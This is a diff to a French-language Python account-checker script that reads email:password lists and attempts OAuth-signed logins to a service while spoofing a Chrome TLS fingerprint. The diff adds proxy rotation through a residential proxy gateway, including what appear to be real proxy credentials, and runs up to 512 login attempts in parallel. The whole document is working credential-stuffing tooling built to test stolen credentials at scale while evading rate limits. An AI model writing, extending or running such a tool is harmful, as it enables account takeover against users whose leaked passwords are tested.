@@ -1,3 +1,6 @@
+import builtins
+
+import threading
 import time
 import uuid
 import json
@@ -5,10 +8,18 @@ import hmac
 import base64
 import hashlib
 import urllib.parse
+from concurrent.futures import ThreadPoolExecutor
 
 import tls_client
 
 from urllib.parse import parse_qs
+
+_print_lock = threading.Lock()
+
+
+def say(*args, **kwargs):
+    with _print_lock:
+        builtins.print(*args, **kwargs)
 
 # =========================================================
 # CONFIG
@@ -22,11 +33,30 @@ CONSUMER_SECRET = "TON_CONSUMER_SECRET"
 # =========================================================
 
 
-def new_session():
-    return tls_client.Session(
+def new_session(proxy_url=None):
+    session = tls_client.Session(
         client_identifier="chrome_131",
         random_tls_extension_order=True,
     )
+    if proxy_url:
+        session.proxies = {
+            "http": proxy_url,
+            "https": proxy_url,
+        }
+    return session
+
+
+def parse_proxy_input(raw):
+    raw = raw.strip().strip('"').strip("'")
+    if not raw:
+        return None
+    parsed = urllib.parse.urlparse(raw)
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        raise ValueError(
+            "Proxy invalide : utilisez par exemple "
+            "http://utilisateur:motdepasse@gw.exemple.com:823"
+        )
+    return raw
 
 
 COMMON_HEADERS = {
@@ -132,25 +162,25 @@ def build_oauth_header(
 
 def print_response(session, response):
 
-    print("\n" + "=" * 70)
-    print("STATUS CODE:")
-    print(response.status_code)
+    say("\n" + "=" * 70)
+    say("STATUS CODE:")
+    say(response.status_code)
 
-    print("\nFINAL URL:")
-    print(response.url)
+    say("\nFINAL URL:")
+    say(response.url)
 
-    print("\nRESPONSE HEADERS:")
+    say("\nRESPONSE HEADERS:")
     for k, v in response.headers.items():
-        print(f"{k}: {v}")
+        say(f"{k}: {v}")
 
-    print("\nRESPONSE COOKIES:")
+    say("\nRESPONSE COOKIES:")
     for cookie in session.cookies:
-        print(f"{cookie.name} = {cookie.value}")
+        say(f"{cookie.name} = {cookie.value}")
 
-    print("\nRESPONSE SOURCE:")
-    print(response.text)
+    say("\nRESPONSE SOURCE:")
+    say(response.text)
 
-    print("=" * 70 + "\n")
+    say("=" * 70 + "\n")
 
 # =========================================================
 # STEPS
@@ -181,7 +211,7 @@ def fetch_request_token(session):
     headers = COMMON_HEADERS.copy()
     headers["Authorization"] = request_auth_header
 
-    print("\nSENDING REQUEST TOKEN REQUEST...\n")
+    say("\nSENDING REQUEST TOKEN REQUEST...\n")
 
     response = session.post(
         REQUEST_TOKEN_URL,
@@ -192,7 +222,7 @@ def fetch_request_token(session):
     print_response(session, response)
 
     if response.status_code != 200:
-        print("REQUEST TOKEN FAILED")
+        say("REQUEST TOKEN FAILED")
         return None
 
     parsed = parse_qs(response.text)
@@ -200,13 +230,13 @@ def fetch_request_token(session):
     oauth_token = parsed["oauth_token"][0]
     oauth_token_secret = parsed["oauth_token_secret"][0]
 
-    print("OAUTH TOKEN:")
-    print(oauth_token)
+    say("OAUTH TOKEN:")
+    say(oauth_token)
 
-    print()
+    say()
 
-    print("OAUTH TOKEN SECRET:")
-    print(oauth_token_secret)
+    say("OAUTH TOKEN SECRET:")
+    say(oauth_token_secret)
 
     return oauth_token, oauth_token_secret
 
@@ -246,7 +276,7 @@ def try_login(session, oauth_token, oauth_token_secret, email, password):
     headers = COMMON_HEADERS.copy()
     headers["Authorization"] = login_auth_header
 
-    print("\nSENDING LOGIN REQUEST...\n")
+    say("\nSENDING LOGIN REQUEST...\n")
 
     response = session.post(
         LOGIN_URL,
@@ -265,16 +295,41 @@ def load_accounts_from_file(path):
             if not line or line.startswith("#"):
                 continue
             if ":" not in line:
-                print(f"Ligne {lineno} ignorée (pas de ':'): {line[:80]}...")
+                say(f"Ligne {lineno} ignorée (pas de ':'): {line[:80]}...")
                 continue
             email, password = line.split(":", 1)
             email = email.strip()
             password = password.strip()
             if not email or not password:
-                print(f"Ligne {lineno} ignorée (email ou mot de passe vide).")
+                say(f"Ligne {lineno} ignorée (email ou mot de passe vide).")
                 continue
             accounts.append((email, password))
     return accounts
+
+
+def process_account(idx, total, email, password, proxy_url):
+    say("\n" + "#" * 70)
+    say(f"Compte {idx}/{total} — {email}")
+    say("#" * 70)
+
+    session = new_session(proxy_url)
+
+    token_pair = fetch_request_token(session)
+    if token_pair is None:
+        say(f"REQUEST TOKEN FAILED pour {email}")
+        return
+
+    oauth_token, oauth_token_secret = token_pair
+
+    try_login(session, oauth_token, oauth_token_secret, email, password)
+
+
+def _run_account_task(task):
+    idx, total, email, password, proxy_url = task
+    try:
+        process_account(idx, total, email, password, proxy_url)
+    except Exception as e:
+        say(f"Erreur pour {email} : {e!r}")
 
 
 def main():
@@ -284,36 +339,49 @@ def main():
     ).strip().strip('"').strip("'")
 
     if not path:
-        print("Aucun chemin fourni.")
+        say("Aucun chemin fourni.")
         return
+
+    proxy_in = input(
+        "Proxy HTTP, format http://user:pass@host:port "
+        "(ex. http://0dd9f8bb4e6fa2b4c384__cr.fr:93e22adb1bccfd1d@gw.dataimpulse.com:823) "
+        "[Entrée vide = sans proxy] : "
+    )
+    try:
+        proxy_url = parse_proxy_input(proxy_in)
+    except ValueError as e:
+        say(str(e))
+        return
+
+    threads_in = input("Nombre de threads : ").strip()
+    try:
+        num_threads = int(threads_in) if threads_in else 1
+    except ValueError:
+        say("Nombre de threads invalide, utilisation de 1.")
+        num_threads = 1
+    num_threads = max(1, min(num_threads, 512))
 
     try:
         accounts = load_accounts_from_file(path)
     except OSError as e:
-        print(f"Impossible de lire le fichier : {e}")
+        say(f"Impossible de lire le fichier : {e}")
         return
 
     if not accounts:
-        print("Aucun compte valide trouvé dans le fichier.")
+        say("Aucun compte valide trouvé dans le fichier.")
         return
 
-    print(f"{len(accounts)} compte(s) à vérifier.\n")
+    say(f"{len(accounts)} compte(s) à vérifier.")
+    say(f"Proxy : {proxy_url or 'aucun (connexion directe)'}")
+    say(f"Threads : {num_threads}\n")
 
-    for idx, (email, password) in enumerate(accounts, start=1):
-        print("\n" + "#" * 70)
-        print(f"Compte {idx}/{len(accounts)} — {email}")
-        print("#" * 70)
+    tasks = [
+        (i + 1, len(accounts), email, password, proxy_url)
+        for i, (email, password) in enumerate(accounts)
+    ]
 
-        session = new_session()
-
-        token_pair = fetch_request_token(session)
-        if token_pair is None:
-            print("Arrêt après échec du request token.")
-            break
-
-        oauth_token, oauth_token_secret = token_pair
-
-        try_login(session, oauth_token, oauth_token_secret, email, password)
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        list(executor.map(_run_account_task, tasks))
 
 
 if __name__ == "__main__":
